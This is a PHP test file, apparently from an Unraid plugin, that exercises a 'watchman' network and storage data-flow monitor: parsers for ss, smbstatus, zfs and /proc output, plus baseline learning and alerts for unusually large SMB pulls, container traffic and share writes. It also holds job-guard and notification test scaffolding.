    $now['tank/Musik'] = $ds(400 * $gb);
    [$added3, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now), 'holder' => 'backup']), $book, $t0 + 1200);
    $now['tank/Musik'] = $ds(200 * $gb);
    [$added4, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now)]), $book, $t0 + 1500);
    $mu = array_column(array_filter($book, 'watchmanOpen'), null, 'key')['flow_gone:share:Musik']['p'] ?? [];
    same('gone: the mover moving (and the round after), the office at work — expected; then 200 GB with nobody connected: the server itself',
        [[], [], [], ['flow_gone'], 400 * $gb, 'server', []],
        [$added, $added2, $added3, $added4, array_sum($flow['gone']['share:Musik']['o'] ?? []), $mu['from'] ?? null, $flow['can']['moving'] ?? null]);

    // a whole share (with a child dataset) put into the storeroom, later the storeroom emptied: never a loss
    $now['tank/Alt'] = $ds(90 * $gb);
    $now['tank/Alt/kind'] = $ds(10 * $gb);
    [, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($now)]), $book, $t0 + 1510);
    unset($now['tank/Alt'], $now['tank/Alt/kind']);
    $now['tank/_UnraidSecretaryOffice-trash-20261006-143000-Alt'] = $ds(90 * $gb);
    $now['tank/_UnraidSecretaryOffice-trash-20261006-143000-Alt/kind'] = $ds(10 * $gb);
    [$a1, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($now)]), $book, $t0 + 1520);
    unset($now['tank/_UnraidSecretaryOffice-trash-20261006-143000-Alt'], $now['tank/_UnraidSecretaryOffice-trash-20261006-143000-Alt/kind']);
    [$a2, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($now)]), $book, $t0 + 1530);
    same('gone: a share put whole into the storeroom, the storeroom emptied — no loss', [[], [], 0],
        [$a1, $a2, array_sum($flow['gone']['share:Alt']['h'] ?? []) + array_sum($flow['gone']['share:Alt']['o'] ?? [])]);

    $f = watchmanFlowSummary($bf, $flow, $t0 + 1600);
    $rows = array_column($f['gone'], null, 'key');
    same('gone on the page: per share and disk, the last 24 h, what was expected, no counters', [300 * $gb, 400 * $gb, 200 * $gb, 'disk1', 100, 10],
        [$rows['share:Serien']['day'] ?? null, $rows['share:Musik']['expected'] ?? null, $rows['share:Musik']['day'] ?? null, $rows['disk:disk1']['disk'] ?? null,
         (int) round($f['limits']['gone_new'] / $gb), $f['limits']['gone_part']]);
    $b2 = ['flow' => $bf];
    watchmanFlowAdopt($b2, array_column($book, null, 'key')['flow_gone:share:Serien'], $t0 + 1700);
    same('gone ack: that much is normal for the share now', 300 * $gb, $b2['flow']['ack']['flow_gone:share:Serien']['bytes'] ?? null);
}

/**
 * The night watchman's data flow: the parsers on real output (ss -tin, smbstatus -b, zfs get,
 * /proc/<pid>/net/dev — addresses anonymised), then rounds on made-up looks: the first look counts
 * nothing, deltas per connection, container and dataset, what is unusual while learning and once
 * learned, the office's own backup and media servers expected, snapshots taken and deleted, a pool
 * asleep, SMB's users, machines and hours, «I know, thanks» raising the normal, the page and metrics.
 */
function testWatchmanFlow(): void
{
    $gb = 1024 ** 3;
    $ports = watchmanFlowPorts(['PORT' => '80', 'PORTSSL' => '443', 'PORTSSH' => '22']);
    same('flow ports: SMB, NFS, SSH, the WebGUI', [22 => 'ssh', 80 => 'web', 139 => 'smb', 443 => 'web', 445 => 'smb', 2049 => 'nfs'], $ports);
    same('flow ports: as var.ini has them', [139 => 'smb', 445 => 'smb', 2049 => 'nfs', 2222 => 'ssh', 8080 => 'web', 8443 => 'web'],
        watchmanFlowPorts(['PORT' => '8080', 'PORTSSL' => '8443', 'PORTSSH' => '2222']));

    // ss -tinH state established '( sport = :445 or … )', as iproute2 7.1 prints it
    $ss = "0      0      192.0.2.20:445 192.0.2.7:55802\n"
        . "\t bbr wscale:6,9 rto:246 rtt:45.275/8.359 ato:118 mss:1368 pmtu:1500 rcvmss:1076 advmss:1448 cwnd:10 ssthresh:33 bytes_sent:32840019 bytes_retrans:661846 bytes_acked:32178173 bytes_received:24455317 segs_out:69826 segs_in:130590 data_segs_out:67789 data_segs_in:65970 send 2417228bps lastsnd:507 lastrcv:507 lastack:464 pacing_rate 903296bps delivery_rate 730048bps delivered:66893 app_limited busy:3078775ms retrans:0/1055 rcv_space:179080 minrtt:26.563 snd_wnd:216832 rcv_wnd:931328 rehash:84 \n"
        . "0      292    192.0.2.20:22  192.0.2.7:58436\n"
        . "\t bbr wscale:6,9 rto:239 rtt:38.161/13.082 ato:40 mss:1368 cwnd:18 bytes_sent:6210 bytes_acked:5918 bytes_received:4974 segs_out:20 segs_in:21 \n"
        . "0      0      192.0.2.20:80  192.0.2.7:58252\n"
        . "\t cubic wscale:7,7 rto:204 rtt:3.2/1.1 mss:1448 cwnd:10 bytes_sent:40185701 bytes_retrans:2734473 bytes_acked:37451228 bytes_received:2212 \n"
        . "0      0      [::ffff:192.0.2.20]:445  [::ffff:192.0.2.8]:49152\n"
        . "\t cubic rto:204 bytes_sent:1000 bytes_received:300 \n"
        . "0      0      [2001:db8::20]:2049  [2001:db8::7%br0]:833\n"
        . "\t cubic rto:204 bytes_sent:77 bytes_acked:70 bytes_received:5 \n"
        . "0      0      192.0.2.20:9100  192.0.2.30:40000\n"
        . "\t cubic bytes_sent:999 bytes_acked:999 \n";
    $c = watchmanSsParse($ss, $ports);
    same('flow ss: the file services only, delivered bytes (acked, else sent), IPv4 inside IPv6, IPv6 without its zone',
        [['192.0.2.7', 'smb', 32178173, 24455317], ['192.0.2.7', 'ssh', 5918, 4974], ['192.0.2.7', 'web', 37451228, 2212], ['192.0.2.8', 'smb', 1000, 300],
         ['2001:db8::7', 'nfs', 70, 5]],
        array_map(fn ($x) => [$x['peer'], $x['service'], $x['sent'], $x['rcvd']], $c));
    same('flow ss: the server\'s side and the ports', ['192.0.2.20', 445, 55802], [$c[0]['local'], $c[0]['lport'], $c[0]['pport']]);
    same('flow ss: nothing', [], watchmanSsParse('', $ports));

    // smbstatus -b --json (Samba 4.22), and the plain table of an older one
    $json = '{"timestamp": "2026-10-06T12:32:21.495236+0200", "version": "4.22.10", "smb_conf": "/etc/samba/smb.conf", "sessions": {"2639366901": {"session_id": "2639366901", '
          . '"server_id": {"pid": "1661504", "task_id": "0", "vnn": "4294967295", "unique_id": "2174023641075356141"}, "uid": 1000, "gid": 100, "username": "benj", '
          . '"groupname": "users", "creation_time": "2026-10-06T08:32:00.685066+02:00", "expiration_time": "30828-09-14T04:48:05.477581+02:00", '
          . '"auth_time": "2026-10-06T08:32:00.730198+02:00", "remote_machine": "192.0.2.7", "hostname": "ipv4:192.0.2.7:55802", "session_dialect": "SMB3_11", '
          . '"client_guid": "f8f6c3f9-c5ef-d249-a58a-7324699ba732", "encryption": {"cipher": "-", "degree": "none"}, "signing": {"cipher": "AES-128-GMAC", "degree": "partial"}, '
          . '"channels": {"0": {"channel_id": "0", "creation_time": "2026-10-06T08:32:00.685066+02:00", "local_address": "ipv4:192.0.2.20:445", "remote_address": "ipv4:192.0.2.7:55802"}}}, '
          . '"77": {"session_id": "77", "username": "nobody", "remote_machine": "laptop", "hostname": "ipv6:[2001:db8::7]:50000", "creation_time": "2026-10-06T09:00:00+02:00"}}}';
    same('flow smbstatus --json: user, address, machine, when it started',
        [['2639366901', 'benj', '192.0.2.7', '192.0.2.7', strtotime('2026-10-06 08:32:00')], ['77', 'nobody', '2001:db8::7', 'laptop', strtotime('2026-10-06 09:00:00')]],
        array_map(fn ($s) => array_values($s), (array) watchmanSmbParse($json)));
    same('flow smbstatus --json: no sessions', [], watchmanSmbParse('{"timestamp": "x", "sessions": {}}'));
    $table = "\nSamba version 4.22.10\nPID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              \n"
           . str_repeat('-', 136) . "\n"
           . "1661504 benj         users        192.0.2.7 (ipv4:192.0.2.7:55802)      SMB3_11           -                    partial(AES-128-GMAC)\n"
           . "2000001 nobody       nogroup      laptop (ipv6:[2001:db8::7]:50000)      SMB3_11           -                    -                    \n\n";
    same('flow smbstatus -b: the table of an older Samba', [['pid1661504', 'benj', '192.0.2.7', '192.0.2.7', null], ['pid2000001', 'nobody', '2001:db8::7', 'laptop', null]],
        array_map(fn ($s) => array_values($s), (array) watchmanSmbParse($table)));
    same('flow smbstatus: neither is none', null, watchmanSmbParse("smbstatus: unknown option --json\n"));

    // zfs get -Hp -o name,property,value -t filesystem,volume -r written,used,snapshots_changed
    $zfs = "tank\twritten\t155648\ntank\tused\t5564653240320\ntank\tsnapshots_changed\t-\n"
         . "tank/appdata\twritten\t2744066048\ntank/appdata\tused\t1366701264896\ntank/appdata\tsnapshots_changed\t1791242200\n"
         . "tank/tmp\twritten\t75522048\ntank/tmp\tused\t75522048\ntank/tmp\tsnapshots_changed\t-\n"
         . "tank/My Files\twritten\t0\ntank/My Files\tused\t98304\ntank/My Files\tsnapshots_changed\t1791280804\n";
    same('flow zfs: written, used, the last snapshot change (none: never a snapshot)',
        ['tank' => ['w' => 155648, 'u' => 5564653240320, 's' => null], 'tank/appdata' => ['w' => 2744066048, 'u' => 1366701264896, 's' => 1791242200],
         'tank/tmp' => ['w' => 75522048, 'u' => 75522048, 's' => null], 'tank/My Files' => ['w' => 0, 'u' => 98304, 's' => 1791280804]], watchmanZfsParse($zfs));

    // /proc/<pid>/net/dev of a container (bridge or macvlan alike): what every interface but lo sent
    $dev = "Inter-|   Receive                                                |  Transmit\n"
         . " face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed\n"
         . "    lo: 4148728   32674    0    0    0     0          0         0  4148728   32674    0    0    0     0       0          0\n"
         . " tunl0:       0       0    0    0    0     0          0         0        0       0    0    0    0     0       0          0\n"
         . "  eth0: 150120315180 264328623    0    0    0     0          0    148454 1735183657381 306999993    0    0    0     0       0          0\n"
         . "  eth1: 5402383   40340    0    0    0     0          0     33756  2026277    6175    0    0    0     0       0          0\n";
    same('flow net/dev: sent bytes without lo', 1735183657381 + 2026277, watchmanNetDevTx($dev));
    same('flow net/dev: nothing readable', null, watchmanNetDevTx(''));
    same('flow size: like the page', ['1023 B', '1.0 GB', '5,0 GB', '38 GB'], [watchmanSize(1023), watchmanSize($gb), watchmanSize(5 * $gb, 'de'), watchmanSize(38 * $gb)]);

    // rounds on made-up looks: Monday 10:02 is the first
    $t0 = strtotime('2026-10-05 10:02:00');
    $conn = fn (string $peer, int $sent, int $pport = 50000, string $svc = 'smb', int $lport = 445) =>
        ['local' => '192.0.2.20', 'lport' => $lport, 'peer' => $peer, 'pport' => $pport, 'service' => $svc, 'sent' => $sent, 'rcvd' => 0];
    $ct = fn (int $pid, string $ns, int $tx, string $image = 'img', bool $host = false) => ['pid' => $pid, 'ns' => $ns, 'tx' => $tx, 'host' => $host, 'image' => $image];
    $ds = fn (int $w, int $u, ?int $s) => ['w' => $w, 'u' => $u, 's' => $s];
    $look = fn (array $o) => $o + ['conns' => [], 'smb' => ['on' => true, 'sessions' => []], 'containers' => null, 'nfs' => false, 'holder' => null, 'kopia' => 'kopia',
                                   'zfs' => null, 'office_shares' => ['UnraidSecretaryOffice']];      // null: not looked at this time
    $sess = fn (string $id, string $user, string $ip, int $start, string $machine = '') => ['id' => $id, 'user' => $user, 'ip' => $ip, 'machine' => $machine, 'start' => $start];
    $cts = fn (int $kopia, int $emby, int $web, int $app) => ['kopia' => $ct(100, 'n1', $kopia, 'ghcr.io/imagegenius/kopia'), 'EmbyServer' => $ct(200, 'n2', $emby, 'emby/embyserver'),
        'web' => $ct(300, 'n3', $web, 'nginx'), 'app' => $ct(400, 'n4', $app), 'app-db' => $ct(401, 'n4', $app), 'node' => $ct(500, 'host', 99 * $gb, 'node-exporter', true)];
    $zfs = fn (int $data, int $media, ?int $snapData = 1000, ?int $snapMedia = 1000, int $place = 0) => ['datasets' => [
        'tank' => $ds(1, 900 * $gb, null), 'tank/data' => $ds($data, 100 * $gb, $snapData), 'tank/data/sub' => $ds(0, $gb, $snapData),
        'tank/media' => $ds($media, 500 * $gb, $snapMedia), 'tank/tmp' => $ds(10 * $gb, 10 * $gb, null),
        'tank/UnraidSecretaryOffice' => $ds($place, 50 * $gb, 1000)], 'pools' => ['tank'], 'asleep' => ['cold']];
    $bf = null;
    $book = [];
    $kinds = fn (array $added) => (function (array $a) { sort($a); return $a; })($added);

    [$added, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['conns' => [$conn('192.0.2.7', 5 * $gb)], 'containers' => $cts(500 * $gb, 10 * $gb, 0, $gb),
        'smb' => ['on' => true, 'sessions' => [$sess('s1', 'benj', '192.0.2.7', $t0 - 3600)]], 'zfs' => $zfs($gb, 0)]), $book, $t0);
    same('flow first look: counters only, nothing told; SMB\'s user and machine are normal', [[], [], ['benj'], ['192.0.2.7'], [watchmanHourOfWeek($t0 - 3600)]],
        [$added, $flow['clients'], array_keys($bf['smb_users']), array_keys($bf['smb_clients']), $bf['smb_clients']['192.0.2.7']['hours']]);
    same('flow first look: containers sharing a network once, the host\'s network apart, every share', [['EmbyServer', 'app', 'kopia', 'web'], ['app-db'], ['node'],
        ['tank/UnraidSecretaryOffice', 'tank/data', 'tank/media', 'tank/tmp']], [(function (array $a) { sort($a); return $a; })(array_keys($flow['containers'])), $flow['containers']['app']['with'],
        $flow['can']['host'], (function (array $a) { sort($a); return $a; })(array_keys($flow['shares']))]);

    // five minutes later, the office's backup holds the engine's lock
    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['holder' => 'backup',
        'conns' => [$conn('192.0.2.7', 6 * $gb), $conn('192.0.2.9', 60 * $gb, 51000), $conn('127.0.0.1', 99 * $gb, 41000, 'web', 443), $conn('192.0.2.7', 2 * 1024 ** 2, 58000, 'web', 80)],
        'containers' => $cts(600 * $gb, 90 * $gb, 60 * $gb, 2 * $gb),
        'smb' => ['on' => true, 'sessions' => [$sess('s1', 'benj', '192.0.2.7', $t0 - 3600), $sess('s2', 'eve', '192.0.2.50', $t0 + 200, 'LAPTOP')]],
        'zfs' => $zfs(31 * $gb, 0, 1000, 1000, 40 * $gb)]), $book, $t0 + 300);
    same('flow: unusual while still learning — a new client with 60 GB in a round, a container with 60 GB, 30 % of a share; a new SMB user and machine',
        ['flow_client', 'flow_container', 'flow_written', 'smb_client', 'smb_user'], $kinds($added));
    $by = array_column(array_filter($book, 'watchmanOpen'), null, 'kind');
    same('flow: who and how much', [['192.0.2.9', 'smb', 60 * $gb, 5, true, 50 * $gb], ['web', 60 * $gb], ['eve', '192.0.2.50', 'LAPTOP']],
        [[$by['flow_client']['p']['ip'], $by['flow_client']['p']['service'], $by['flow_client']['p']['bytes'], $by['flow_client']['p']['minutes'],
          $by['flow_client']['p']['learning'], $by['flow_client']['p']['limit']],
         [$by['flow_container']['p']['name'], $by['flow_container']['p']['bytes']], [$by['smb_user']['p']['user'], $by['smb_user']['p']['ip'], $by['smb_user']['p']['machine']]]);
    $h = intdiv($t0 + 300, 3600);
    same('flow: the office\'s backup — Kopia\'s upload and its backup place kept apart, never told; other shares judged; a media server streams',
        [[$h => 100 * $gb], [], [$h => 40 * $gb], [], [$h => 30 * $gb], [$h => 80 * $gb]],
        [$flow['containers']['kopia']['o'], $flow['containers']['kopia']['h'], $flow['shares']['tank/UnraidSecretaryOffice']['o'],
         $flow['shares']['tank/UnraidSecretaryOffice']['h'], $flow['shares']['tank/data']['h'], $flow['containers']['EmbyServer']['h']]);
    same('flow entry: a share in words', '30 GB written into tank/data in 5 min — 30 % of the share while I\'m still learning what is normal',
        officeNotifyText('watchman', 'entry.flow_written', watchmanText($by['flow_written'], 'en'), 'en'));
    same('flow: per client and service, the server talking to itself left out', [['192.0.2.7|smb', '192.0.2.9|smb', '192.0.2.7|web'], 61 * $gb, 2 * 1024 ** 2],
        [array_keys($flow['clients']), $flow['totals']['sent']['smb'], $flow['totals']['sent']['web']]);
    same('flow: containers sharing a network counted once', [$h => $gb], $flow['containers']['app']['h']);
    same('flow: the office at work, on the page', 'backup', $flow['can']['office']);

    // the backup is done; the pull goes on, a share gets a lot written
    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look([
        'conns' => [$conn('192.0.2.7', 6 * $gb), $conn('192.0.2.9', 70 * $gb, 51000)], 'containers' => $cts(605 * $gb, 90 * $gb, 60 * $gb, 2 * $gb),
        'zfs' => $zfs(61 * $gb, 0, 1000, 1000, 40 * $gb)]), $book, $t0 + 600);
    $by = array_column(array_filter($book, 'watchmanOpen'), null, 'kind');
    same('flow: going on, the entries count on (bytes, minutes, the part of the share) — nothing new', [[], 60 * $gb, 60, 10, 70 * $gb, 10, 1],
        [$added, $by['flow_written']['p']['bytes'], $by['flow_written']['p']['pct'], $by['flow_written']['p']['minutes'], $by['flow_client']['p']['bytes'],
         $by['flow_client']['p']['minutes'], $by['flow_client']['count']]);
    same('flow: Kopia outside the backup is learned like any other', [$h => 5 * $gb], $flow['containers']['kopia']['h']);
    same('flow entry: in words (English)', '192.0.2.9 pulled 70 GB over SMB in 10 min — more than 50 GB in one round while I\'m still learning what is normal',
        officeNotifyText('watchman', 'entry.flow_client', watchmanText($by['flow_client'], 'en'), 'en'));

    // snapshots: one taken (written drops: what came since), one deleted (it grew: can't be told — left out)
    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs(2 * $gb, 5 * $gb, $t0 + 850, $t0 + 880)]), $book, $t0 + 900);
    same('flow written: a new snapshot counts what came since it, a deleted one leaves the round out', [62 * $gb, 0],
        [$flow['totals']['written']['tank/data'], $flow['totals']['written']['tank/media'] ?? 0]);
    same('flow written: since the latest snapshot, and whether there is one', [2 * $gb, $t0 + 850, true, false],
        [$flow['shares']['tank/data']['w'], $flow['shares']['tank/data']['s'], $flow['shares']['tank/data']['snap'], $flow['shares']['tank/tmp']['snap']]);
    // the pool asleep: never asked, its counters kept; awake again: what came meanwhile
    [, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => ['datasets' => [], 'pools' => [], 'asleep' => ['tank', 'cold']]]), $book, $t0 + 1200);
    same('flow: a sleeping pool keeps its counters', [2 * $gb, $t0 + 850], $cnt['ds']['tank/data']);
    [, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs(3 * $gb, 5 * $gb, $t0 + 850, $t0 + 880)]), $book, $t0 + 1500);
    same('flow: awake again — counted on', 63 * $gb, $flow['totals']['written']['tank/data']);
    // a container restarted: its counters start anew
    $re = $cts(605 * $gb, 90 * $gb, 60 * $gb, 2 * $gb);
    $re['web'] = $ct(301, 'n3b', 3 * 1024 ** 2, 'nginx');
    [, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['containers' => $re]), $book, $t0 + 1800);
    same('flow: a restarted container counts from its start (containers not looked at meanwhile: counted on)', 60 * $gb + 3 * 1024 ** 2,
        array_sum($flow['containers']['web']['h']));

    // «I know, thanks» on the learning ones: that much is normal now
    $b2 = ['flow' => $bf];
    foreach ($book as $i => $e) {
        if (watchmanOpen($e)) {
            watchmanFlowAdopt($b2, $e, $t0 + 2000);
            $book[$i]['noted'] = $t0 + 2000;
        }
    }
    $bf = $b2['flow'];
    same('flow ack: the most of the pull is normal for it; the user and the machine known', [70 * $gb, 60 * $gb, true, true],
        [$bf['ack']['flow_client:192.0.2.9|smb']['bytes'] ?? null, $bf['ack']['flow_container:web']['bytes'] ?? null, isset($bf['smb_users']['eve']), isset($bf['smb_clients']['192.0.2.50'])]);
    $prevTime = $t0 + 2100;
    $cnt = ['time' => $prevTime, 'conns' => ['192.0.2.20:445>192.0.2.9:52000' => 0], 'cts' => $cnt['cts'], 'ds' => $cnt['ds'], 'smb' => []];
    [$added] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.9', 100 * $gb, 52000)]]), $book, $t0 + 2400);
    same('flow ack: twice as much again stays quiet (under ' . WATCH_FLOW_FACTOR . ' × the normal)', [], $added);

    // learned: a client with a week and more of history — unusual is far more than at that time of the week
    $t = strtotime('2026-10-12 10:20:00');               // Monday
    $bfL = ['since' => $t - 9 * 86400, 'smb_users' => ['benj' => $t - 9 * 86400],
            'smb_clients' => ['192.0.2.7' => ['first' => $t - 9 * 86400, 'last' => $t - 600, 'hours' => [watchmanHourOfWeek($t)], 'name' => '']], 'ack' => []];
    $flowL = ['since' => $t - 9 * 86400, 'clients' => ['192.0.2.7|smb' => watchmanFlowSeries($t - 9 * 86400,
        ['last' => $t - 86400, 'h' => [intdiv($t - 7 * 86400, 3600) => $gb, intdiv($t - 7 * 86400 - 3600, 3600) => intdiv($gb, 2), intdiv($t - 3 * 86400, 3600) => 2 * $gb]])],
        'containers' => [], 'shares' => [], 'totals' => ['sent' => [], 'written' => []]];
    same('flow usual: the most at this time of the week (±1 h), or a quarter of the busiest hour', $gb, watchmanFlowUsual($flowL['clients']['192.0.2.7|smb']['h'], $t));
    $k = '192.0.2.20:445>192.0.2.7:60000';
    $bookL = [];
    $prevL = ['time' => $t - 300, 'conns' => [$k => 0], 'cts' => [], 'ds' => [], 'smb' => ['s1']];
    [$added, $flowL, $prevL] = watchmanFlowCompare($bfL, $flowL, $prevL, $look(['conns' => [$conn('192.0.2.7', 3 * $gb, 60000)],
        'smb' => ['on' => true, 'sessions' => [$sess('s1', 'benj', '192.0.2.7', $t - 7200), $sess('s3', 'benj', '192.0.2.7', $t - 100)]]]), $bookL, $t);
    same('flow learned: 3 GB in the hour, usually 1 GB — not unusual (limit 4 GB); a session at a known hour', [], $added);
    [$added, $flowL, $prevL] = watchmanFlowCompare($bfL, $flowL, $prevL, $look(['conns' => [$conn('192.0.2.7', 5 * $gb, 60000)],
        'smb' => ['on' => true, 'sessions' => [$sess('s1', 'benj', '192.0.2.7', $t - 7200), $sess('s3', 'benj', '192.0.2.7', $t - 100)]]]), $bookL, $t + 300);
    $e = array_values(array_filter($bookL, 'watchmanOpen'))[0] ?? [];
    same('flow learned: 5 GB in the hour — told, with what is normal', [['flow_client'], '192.0.2.7 pulled 5.0 GB over SMB in 10 min — usually at most 1.0 GB per hour at this time'],
        [$added, officeNotifyText('watchman', 'entry.flow_client', watchmanText($e, 'en'), 'en')]);
    $wed3 = strtotime('2026-10-14 03:10:00');
    $prevL['time'] = $wed3 - 300;
    [$added] = watchmanFlowCompare($bfL, $flowL, $prevL, $look(['conns' => [], 'smb' => ['on' => true, 'sessions' => [$sess('s4', 'benj', '192.0.2.7', $wed3 - 60)]]]), $bookL, $wed3);
    $e = array_column(array_filter($bookL, 'watchmanOpen'), null, 'kind')['smb_hour'] ?? [];
    same('flow SMB: a session at an hour that machine never used', [['smb_hour'], [watchmanHourOfWeek($wed3)], 'Wed 03:00'],
        [$added, $e['p']['hours'] ?? null, watchmanText($e)['hours'] ?? null]);
    $b3 = ['flow' => $bfL];
    watchmanFlowAdopt($b3, $e, $wed3);
    same('flow SMB ack: the hour is normal for it', true, in_array(watchmanHourOfWeek($wed3), $b3['flow']['smb_clients']['192.0.2.7']['hours'], true));

    // tidy: hours beyond the kept days and tiny past hours go
    $old = ['since' => 0, 'clients' => ['x|smb' => watchmanFlowSeries($t - 20 * 86400, ['last' => $t, 'h' => [intdiv($t - 15 * 86400, 3600) => 9 * $gb,
        intdiv($t - 7200, 3600) => 1000, intdiv($t - 3600, 3600) => 5 * $gb, intdiv($t, 3600) => 10]])], 'containers' => [], 'shares' => [], 'totals' => ['sent' => [], 'written' => []]];
    $bfT = ['since' => 0, 'smb_users' => [], 'smb_clients' => [], 'ack' => ['flow_client:gone|smb' => ['bytes' => 1, 'time' => 0]]];
    watchmanFlowTidy($bfT, $old, $t);
    same('flow tidy: kept days, tiny past hours out, the hour going on stays; notes of what is gone go', [[intdiv($t - 3600, 3600), intdiv($t, 3600)], []],
        [array_keys($old['clients']['x|smb']['h']), $bfT['ack']]);

    // a whole round with the data flow, on copies: flow.json, the page, the metrics, «I know, thanks»
    $tmp = sys_get_temp_dir() . '/office-tests-flow-' . getmypid();
    $src = "$tmp/src";
    $data = "$tmp/data";
    @mkdir("$src/plugins", 0700, true);
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd", 'shadow' => "$src/shadow",
              'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
    file_put_contents($paths['syslog'], '');
    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
    $now = $t0;
    $looks = [$look(['conns' => [$conn('192.0.2.7', $gb)], 'zfs' => $zfs($gb, 0)]),
              $look(['conns' => [$conn('192.0.2.7', $gb), $conn('192.0.2.9', 60 * $gb, 51000)], 'zfs' => $zfs(2 * $gb, 0)])];
    $i = 0;
    $flowFn = function (?array $containers) use (&$looks, &$i) {
        return $looks[$i++];
    };
    $docker = fn () => [];
    $acks = "$tmp/acks.json";
    $r = watchmanRound($paths, $data, 1000, $now, $docker, false, $acks, $flowFn);
    same('flow round: taken over — learning starts, nothing told', [true, [], true], [$r['fresh'], $r['added'], is_file("$data/flow.json")]);
    $r = watchmanRound($paths, $data, 1000, $now + 300, $docker, false, $acks, $flowFn);
    same('flow round: a new client pulling 60 GB', ['flow_client'], $r['added']);
    $page = watchmanPageState($data, $now + 400, false);
    $f = $page['flow'];
    same('flow page: learning, per client the last 24 h, the share, what works here', [0, 7, ['192.0.2.9', 60 * $gb], ['tank/data', $gb], true, ['tank'], ['cold']],
        [$f['days'], $f['learn'], [$f['clients'][0]['ip'], $f['clients'][0]['day']], [$f['shares'][0]['share'], $f['shares'][0]['day']], $f['can']['ss'],
         $f['can']['zfs']['pools'], $f['can']['zfs']['asleep']]);
    check('flow page: no counters, no internals', !preg_match('/"(?:conns|cts|ds|_h|_f|run|h|o)"\s*:/', json_encode($page['flow'])));
    $m = array_column(watchmanMetrics($data), null, 'name');
    same('flow metrics: sent per service, written per share (counters)', ['counter', [['service' => 'smb'], 60 * $gb], [['share' => 'tank/data'], $gb]],
        [$m['uso_watchman_sent_bytes_total']['type'] ?? null, $m['uso_watchman_sent_bytes_total']['samples'][0] ?? null, $m['uso_watchman_written_bytes_total']['samples'][0] ?? null]);
    watchmanAck('*', $data, $now + 500, false);
    same('flow ack through his page: the client\'s normal raised', 60 * $gb, watchmanLoad($data)['baseline']['flow']['ack']['flow_client:192.0.2.9|smb']['bytes'] ?? null);
    $f = array_column(watchmanFindings([watchmanEntry('flow_client', 'flow_client:x', $now, ['ip' => '192.0.2.9', 'service' => 'smb', 'bytes' => 5, 'minutes' => 3])]), null, 'id');
    same('flow finding for the team lead: what moves left out (his «I know, thanks» holds while a pull goes on)', [false, false, '5 B'],
        [isset($f['flow_client']['params']['minutes']), isset($f['flow_client']['params']['usual']), $f['flow_client']['params']['size'] ?? null]);
    @unlink(watchmanLockFile($data, 'book'));
    @unlink(watchmanFlowCountersFile($data));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/** job.sh: a second start of the same job in the same minute ends quietly, with one line for the syslog */
function testJobGuard(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-jobsh-' . getmypid();
    @mkdir("$tmp/plugin/scripts", 0700, true);
    $script = (string) file_get_contents(OFFICE_DIR . '/plugin/scripts/job.sh');
    $script = str_replace(['DIR=/usr/local/emhttp/plugins/unraid-secretary-office', 'RUN=/var/run/unraid-secretary-office', 'logger -t unraid-secretary-office'],
                          ["DIR=$tmp/plugin", "RUN=$tmp/run", "echo >> $tmp/syslog"], $script, $n);
    same('job guard: the copy points to the test folder', 3, $n);
    file_put_contents("$tmp/job.sh", $script);
    file_put_contents("$tmp/plugin/scripts/agent.sh", "echo \"\$1\" >> $tmp/ran\n");
    $run = function () use ($tmp): string {
        exec('bash ' . escapeshellarg("$tmp/job.sh") . ' watch 2>&1', $out, $code);
        return "$code";
    };
    for ($i = 0; $i < 2; $i++) {        // a minute turning between the two starts: once more
        @unlink("$tmp/ran");
        @unlink("$tmp/syslog");
        @unlink("$tmp/run/job-watch.minute");
        $minute = date('YmdHi');
        $codes = [$run(), $run()];
        if (date('YmdHi') === $minute) {
            break;
        }
    }
    same('job guard: the first start runs, the second in the same minute ends quietly', [['0', '0'], "watch\n", "job watch: second start in the same minute skipped\n"],
        [$codes, @file_get_contents("$tmp/ran"), @file_get_contents("$tmp/syslog")]);
    file_put_contents("$tmp/run/job-watch.minute", "200001010000\n");
    $run();
    same('job guard: another minute runs again', "watch\nwatch\n", @file_get_contents("$tmp/ran"));
    same('job guard: an unknown job is refused before anything', '2', (function () use ($tmp) { exec('bash ' . escapeshellarg("$tmp/job.sh") . ' nope', $o, $c); return "$c"; })());
    exec('rm -rf ' . escapeshellarg($tmp));
}

// ===================================================================== notifications

/**
 * Reports to Unraid's notifications: the caretaker's transitions (new red →
 * told once it stayed, same → quiet, solved and back → told again), with a
 * stand-in notify in a temporary folder; Jack Emby's choice of what to tell.
 */
function testNotify(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-notify-' . getmypid();
    @mkdir($tmp, 0700, true);
    $log = "$tmp/notified";
    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($log) . "\necho >> " . escapeshellarg($log) . "\n");
    chmod("$tmp/notify", 0755);
    $before = getenv('OFFICE_NOTIFY_BIN');
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
